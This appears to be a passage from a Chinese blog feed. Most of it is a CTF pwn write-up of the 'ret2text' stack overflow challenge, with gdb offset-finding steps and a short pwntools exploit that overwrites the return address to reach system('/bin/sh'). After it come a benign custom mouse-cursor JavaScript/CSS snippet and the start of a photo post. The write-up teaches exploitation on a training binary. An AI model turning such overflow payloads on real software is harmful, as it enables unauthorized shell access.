<p><mark>发生栈溢出的条件</mark> 程序必须向栈上写入数据。写入的数据大小没有被良好地控制</p>
<p><mark>利用方式</mark> 覆盖程序的返回地址为攻击者所控制的地址，比如该地址为执行 shellcode 的地址 shellcode 是一段用于利用软件漏洞而执行的代码，shellcode 为 16 进制的机器码，可以让攻击者获得 shell，利用 pwntools 可自动生成，等用到再说。可能造成栈溢出的函数。</p>
<p><mark>可能造成栈溢出的函数有</mark> gets,scanf,vscanf,sprintf,strcpy,strcat，bcopy</p>
<h2 id="0x3"><a class="anchor" href="#0x3">#</a> 0x3</h2>
<p>继续浏览其他函数的伪代码。发现 secure 函数中调用了 system（“/bin/sh”）<br />
我们只需要想办法执行这 system（“/bin/sh”）从而拿到我们想要的 shell。</p>
<p><img data-src="https://i.loli.net/2021/07/17/W9wVaYDsjxrvuHO.png" alt="22508867-4978445eded254f2.png" /></p>
<p>我们现在大概确定了栈溢出漏洞，我们首先要知道这个漏洞到底有多深，然后我们了解了这个漏洞的深度把东西填装进去让他覆盖到这个 system（“/bin/sh”）这个地址我们就可以得到 shell 了。</p>
<p>那如何确定这个偏移量和这个地址呢？</p>
<h3 id="step1"><a class="anchor" href="#step1">#</a> step1</h3>
<p>利用 gdb 进行调试看它的偏移</p>
<figure class="highlight html"><figcaption data-lang="HTML"></figcaption><table><tr><td data-num="1"></td><td><pre>gdb -q ./ret2text         </pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>//gdb载入该文件</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>pattern create 200     </pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre>//制造200个填充字符（多少字符都行），先把他复制下来</pre></td></tr><tr><td data-num="8"></td><td><pre></pre></td></tr><tr><td data-num="9"></td><td><pre>r                                 </pre></td></tr><tr><td data-num="10"></td><td><pre></pre></td></tr><tr><td data-num="11"></td><td><pre>//运行程序</pre></td></tr><tr><td data-num="12"></td><td><pre></pre></td></tr><tr><td data-num="13"></td><td><pre>pattern offset 地址     </pre></td></tr><tr><td data-num="14"></td><td><pre></pre></td></tr><tr><td data-num="15"></td><td><pre>//确定偏移</pre></td></tr></table></figure><p><img data-src="https://i.loli.net/2021/07/17/QrWMyxmt9c7dqFA.png" alt="22508867-ef5ed1b8bd807dd4.png" /></p>
<p><img data-src="https://i.loli.net/2021/07/17/39y6AenLE81Ubqu.png" alt="22508867-fdfe76ec3c0ba50d.PNG" /></p>
<p>计算的偏移量为 112，下面找到 system（“/bin/sh”）地址就可以构造 exp 了，<br />
那么我们看 IDA 在 secure 中调用 system (“/bin/sh”) 的地址</p>
<p><img data-src="https://i.loli.net/2021/07/17/pGdWFzivRoO8gME.png" alt="22508867-0252408325f50505.png" /></p>
<p><mark>exp 如下</mark></p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>                                 </pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token operator">//</span>导入python库</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./ret2text"</span><span class="token punctuation">)</span>                     </pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token operator">//</span>与文件建立本地连接，远程连接用r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'ip'</span><span class="token punctuation">,</span>端口<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="8"></td><td><pre></pre></td></tr><tr><td data-num="9"></td><td><pre>payload <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">112</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x804863A</span><span class="token punctuation">)</span> </pre></td></tr><tr><td data-num="10"></td><td><pre></pre></td></tr><tr><td data-num="11"></td><td><pre> <span class="token operator">//</span>p32<span class="token punctuation">(</span><span class="token punctuation">)</span>将其打包，<span class="token number">64</span>位用p64<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="12"></td><td><pre></pre></td></tr><tr><td data-num="13"></td><td><pre>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>                           </pre></td></tr><tr><td data-num="14"></td><td><pre></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token operator">//</span>发送payload</pre></td></tr><tr><td data-num="16"></td><td><pre></pre></td></tr><tr><td data-num="17"></td><td><pre>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>                                     </pre></td></tr><tr><td data-num="18"></td><td><pre></pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token operator">//</span>直接进行交互，相当于回到shell的模式，在取得shell之后使用</pre></td></tr></table></figure><h3 id="执行exp"><a class="anchor" href="#执行exp">#</a> 执行 exp</h3>
<p><img data-src="https://i.loli.net/2021/07/17/WFyMsIKdTXYcSZn.png" alt="22508867-d06a7cdcfdeb9781.png" /></p>
]]></content>
      <categories>
        <category>wiki</category>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>ret2text</tag>
      </tags>
  </entry>
  <entry>
    <title>something 4 u</title>
    <url>/something-4-u/</url>
    <content><![CDATA[<p>关于本主题的指针<br />
<a id="more"></a><br />
 我自己用的 shoka，所以直接放在了 public 的 css 和 js 中；源代码如下：</p>
<p>javascript 部分:</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>Math<span class="token punctuation">.</span><span class="token function-variable function">lerp</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> n</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">-</span> n<span class="token punctuation">)</span> <span class="token operator">*</span> a <span class="token operator">+</span> n <span class="token operator">*</span> b<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>        <span class="token keyword">const</span> <span class="token function-variable function">getStyle</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">el<span class="token punctuation">,</span> attr</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>            <span class="token keyword">try</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>                <span class="token keyword">return</span> window<span class="token punctuation">.</span>getComputedStyle</pre></td></tr><tr><td data-num="6"></td><td><pre>                    <span class="token operator">?</span> window<span class="token punctuation">.</span><span class="token function">getComputedStyle</span><span class="token punctuation">(</span>el<span class="token punctuation">)</span><span class="token punctuation">[</span>attr<span class="token punctuation">]</span></pre></td></tr><tr><td data-num="7"></td><td><pre>                    <span class="token operator">:</span> el<span class="token punctuation">.</span>currentStyle<span class="token punctuation">[</span>attr<span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>            <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>            <span class="token keyword">return</span> <span class="token string">""</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre>        <span class="token keyword">class</span> <span class="token class-name">Cursor</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>            <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>                <span class="token keyword">this</span><span class="token punctuation">.</span>pos <span class="token operator">=</span> <span class="token punctuation">&#123;</span> curr<span class="token operator">:</span> <span class="token keyword">null</span><span class="token punctuation">,</span> prev<span class="token operator">:</span> <span class="token keyword">null</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>                <span class="token keyword">this</span><span class="token punctuation">.</span>pt <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>                <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>                <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>                <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>            <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="20"></td><td><pre></pre></td></tr><tr><td data-num="21"></td><td><pre>            <span class="token function">move</span><span class="token punctuation">(</span><span class="token parameter">left<span class="token punctuation">,</span> top</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>                <span class="token keyword">this</span><span class="token punctuation">.</span>cursor<span class="token punctuation">.</span>style<span class="token punctuation">[</span><span class="token string">"left"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>left<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">px</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="23"></td><td><pre>                <span class="token keyword">this</span><span class="token punctuation">.</span>cursor<span class="token punctuation">.</span>style<span class="token punctuation">[</span><span class="token string">"top"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>top<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">px</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>            <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="25"></td><td><pre></pre></td></tr><tr><td data-num="26"></td><td><pre>            <span class="token function">create</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="27"></td><td><pre>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span>cursor<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="28"></td><td><pre>                    <span class="token keyword">this</span><span class="token punctuation">.</span>cursor <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">"div"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="29"></td><td><pre>                    <span class="token keyword">this</span><span class="token punctuation">.</span>cursor<span class="token punctuation">.</span>id <span class="token operator">=</span> <span class="token string">"cursor"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="30"></td><td><pre>                    <span class="token keyword">this</span><span class="token punctuation">.</span>cursor<span class="token punctuation">.</span>classList<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"hidden"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="31"></td><td><pre>                    document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>cursor<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="32"></td><td><pre>                <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="33"></td><td><pre></pre></td></tr><tr><td data-num="34"></td><td><pre>                <span class="token keyword">var</span> el <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementsByTagName</span><span class="token punctuation">(</span><span class="token string">'*'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="35"></td><td><pre>                <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> el<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="36"></td><td><pre>                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">getStyle</span><span class="token punctuation">(</span>el<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"cursor"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">"pointer"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="37"></td><td><pre>                        <span class="token keyword">this</span><span class="token punctuation">.</span>pt<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>el<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>outerHTML<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="38"></td><td><pre>                document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>scr <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">"style"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="39"></td><td><pre>                <span class="token keyword">this</span><span class="token punctuation">.</span>scr<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">* &#123;cursor: url("data:image/svg+xml,&lt;svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 8 8' width='8px' height='8px'>&lt;circle cx='4' cy='4' r='4' opacity='.5'/>&lt;/svg>") 4 4, auto !important&#125;</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="40"></td><td><pre>            <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="41"></td><td><pre></pre></td></tr><tr><td data-num="42"></td><td><pre>            <span class="token function">refresh</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="43"></td><td><pre>                <span class="token keyword">this</span><span class="token punctuation">.</span>scr<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="44"></td><td><pre>                <span class="token keyword">this</span><span class="token punctuation">.</span>cursor<span class="token punctuation">.</span>classList<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token string">"hover"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="45"></td><td><pre>                <span class="token keyword">this</span><span class="token punctuation">.</span>cursor<span class="token punctuation">.</span>classList<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token string">"active"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="46"></td><td><pre>                <span class="token keyword">this</span><span class="token punctuation">.</span>pos <span class="token operator">=</span> <span class="token punctuation">&#123;</span> curr<span class="token operator">:</span> <span class="token keyword">null</span><span class="token punctuation">,</span> prev<span class="token operator">:</span> <span class="token keyword">null</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="47"></td><td><pre>                <span class="token keyword">this</span><span class="token punctuation">.</span>pt <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="48"></td><td><pre>                <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="49"></td><td><pre>                <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="50"></td><td><pre>                <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="51"></td><td><pre>            <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="52"></td><td><pre></pre></td></tr><tr><td data-num="53"></td><td><pre>            <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="54"></td><td><pre>                document<span class="token punctuation">.</span><span class="token function-variable function">onmouseover</span> <span class="token operator">=</span> <span class="token parameter">e</span> <span class="token operator">=></span> <span class="token keyword">this</span><span class="token punctuation">.</span>pt<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>target<span class="token punctuation">.</span>outerHTML<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">this</span><span class="token punctuation">.</span>cursor<span class="token punctuation">.</span>classList<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"hover"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="55"></td><td><pre>                document<span class="token punctuation">.</span><span class="token function-variable function">onmouseout</span> <span class="token operator">=</span> <span class="token parameter">e</span> <span class="token operator">=></span> <span class="token keyword">this</span><span class="token punctuation">.</span>pt<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>target<span class="token punctuation">.</span>outerHTML<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">this</span><span class="token punctuation">.</span>cursor<span class="token punctuation">.</span>classList<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token string">"hover"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="56"></td><td><pre>                document<span class="token punctuation">.</span><span class="token function-variable function">onmousemove</span> <span class="token operator">=</span> <span class="token parameter">e</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>pos<span class="token punctuation">.</span>curr <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">move</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>clientX <span class="token operator">-</span> <span class="token number">8</span><span class="token punctuation">,</span> e<span class="token punctuation">.</span>clientY <span class="token operator">-</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">this</span><span class="token punctuation">.</span>pos<span class="token punctuation">.</span>curr <span class="token operator">=</span> <span class="token punctuation">&#123;</span> x<span class="token operator">:</span> e<span class="token punctuation">.</span>clientX <span class="token operator">-</span> <span class="token number">8</span><span class="token punctuation">,</span> y<span class="token operator">:</span> e<span class="token punctuation">.</span>clientY <span class="token operator">-</span> <span class="token number">8</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span> <span class="token keyword">this</span><span class="token punctuation">.</span>cursor<span class="token punctuation">.</span>classList<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token string">"hidden"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="57"></td><td><pre>                document<span class="token punctuation">.</span><span class="token function-variable function">onmouseenter</span> <span class="token operator">=</span> <span class="token parameter">e</span> <span class="token operator">=></span> <span class="token keyword">this</span><span class="token punctuation">.</span>cursor<span class="token punctuation">.</span>classList<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token string">"hidden"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="58"></td><td><pre>                document<span class="token punctuation">.</span><span class="token function-variable function">onmouseleave</span> <span class="token operator">=</span> <span class="token parameter">e</span> <span class="token operator">=></span> <span class="token keyword">this</span><span class="token punctuation">.</span>cursor<span class="token punctuation">.</span>classList<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"hidden"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="59"></td><td><pre>                document<span class="token punctuation">.</span><span class="token function-variable function">onmousedown</span> <span class="token operator">=</span> <span class="token parameter">e</span> <span class="token operator">=></span> <span class="token keyword">this</span><span class="token punctuation">.</span>cursor<span class="token punctuation">.</span>classList<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"active"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="60"></td><td><pre>                document<span class="token punctuation">.</span><span class="token function-variable function">onmouseup</span> <span class="token operator">=</span> <span class="token parameter">e</span> <span class="token operator">=></span> <span class="token keyword">this</span><span class="token punctuation">.</span>cursor<span class="token punctuation">.</span>classList<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token string">"active"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="61"></td><td><pre>            <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="62"></td><td><pre></pre></td></tr><tr><td data-num="63"></td><td><pre>            <span class="token function">render</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="64"></td><td><pre>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>pos<span class="token punctuation">.</span>prev<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="65"></td><td><pre>                    <span class="token keyword">this</span><span class="token punctuation">.</span>pos<span class="token punctuation">.</span>prev<span class="token punctuation">.</span>x <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">lerp</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>pos<span class="token punctuation">.</span>prev<span class="token punctuation">.</span>x<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>pos<span class="token punctuation">.</span>curr<span class="token punctuation">.</span>x<span class="token punctuation">,</span> <span class="token number">0.15</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="66"></td><td><pre>                    <span class="token keyword">this</span><span class="token punctuation">.</span>pos<span class="token punctuation">.</span>prev<span class="token punctuation">.</span>y <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">lerp</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>pos<span class="token punctuation">.</span>prev<span class="token punctuation">.</span>y<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>pos<span class="token punctuation">.</span>curr<span class="token punctuation">.</span>y<span class="token punctuation">,</span> <span class="token number">0.15</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="67"></td><td><pre>                    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">move</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>pos<span class="token punctuation">.</span>prev<span class="token punctuation">.</span>x<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>pos<span class="token punctuation">.</span>prev<span class="token punctuation">.</span>y<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="68"></td><td><pre>                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="69"></td><td><pre>                    <span class="token keyword">this</span><span class="token punctuation">.</span>pos<span class="token punctuation">.</span>prev <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>pos<span class="token punctuation">.</span>curr<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="70"></td><td><pre>                <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="71"></td><td><pre>                <span class="token function">requestAnimationFrame</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="72"></td><td><pre>            <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="73"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="74"></td><td><pre></pre></td></tr><tr><td data-num="75"></td><td><pre>        <span class="token keyword">var</span> <span class="token constant">CURSOR</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Cursor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr></table></figure><p>css 部分：</p>
<figure class="highlight css"><figcaption data-lang="CSS"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token selector">#cursor</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>            <span class="token property">position</span><span class="token punctuation">:</span> fixed<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>            <span class="token property">width</span><span class="token punctuation">:</span> 16px<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>            <span class="token property">height</span><span class="token punctuation">:</span> 16px<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>            <span class="token property">background</span><span class="token punctuation">:</span> #000<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>            <span class="token property">border-radius</span><span class="token punctuation">:</span> 8px<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>            <span class="token property">opacity</span><span class="token punctuation">:</span> 0.25<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>            <span class="token property">z-index</span><span class="token punctuation">:</span> 10086<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>            <span class="token property">pointer-events</span><span class="token punctuation">:</span> none<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>            <span class="token property">transition</span><span class="token punctuation">:</span> 0.2s ease-in-out<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>            <span class="token property">transition-property</span><span class="token punctuation">:</span> background<span class="token punctuation">,</span> opacity<span class="token punctuation">,</span> transform<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre>        <span class="token selector">#cursor.hidden</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>            <span class="token property">opacity</span><span class="token punctuation">:</span> 0<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="17"></td><td><pre></pre></td></tr><tr><td data-num="18"></td><td><pre>        <span class="token selector">#cursor.hover</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>            <span class="token property">opacity</span><span class="token punctuation">:</span> 0.1<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>            <span class="token property">transform</span><span class="token punctuation">:</span> <span class="token function">scale</span><span class="token punctuation">(</span>2.5<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="22"></td><td><pre></pre></td></tr><tr><td data-num="23"></td><td><pre>        <span class="token selector">#cursor.active</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>            <span class="token property">opacity</span><span class="token punctuation">:</span> 0.5<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="25"></td><td><pre>            <span class="token property">transform</span><span class="token punctuation">:</span> <span class="token function">scale</span><span class="token punctuation">(</span>0.5<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="26"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>该鼠标指针来自<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLnhlY2FkZXMueHl6L2FydGljbGVzL2N1cnNvci8="> Xecades</span></p>
]]></content>
      <categories>
        <category>wiki</category>
      </categories>
      <tags>
        <tag>鼠标指针</tag>
      </tags>
  </entry>
  <entry>
    <title>夏天就该喝糖果汽水才对嘛</title>
    <url>/%E5%91%90-%E7%B3%96%E6%9E%9C%E8%89%B2%E8%B0%83%E7%9A%84%E5%9B%BE%E7%89%87/</url>
    <content><![CDATA[<p>好想要相机喔<br />
<a id="more"></a><br />
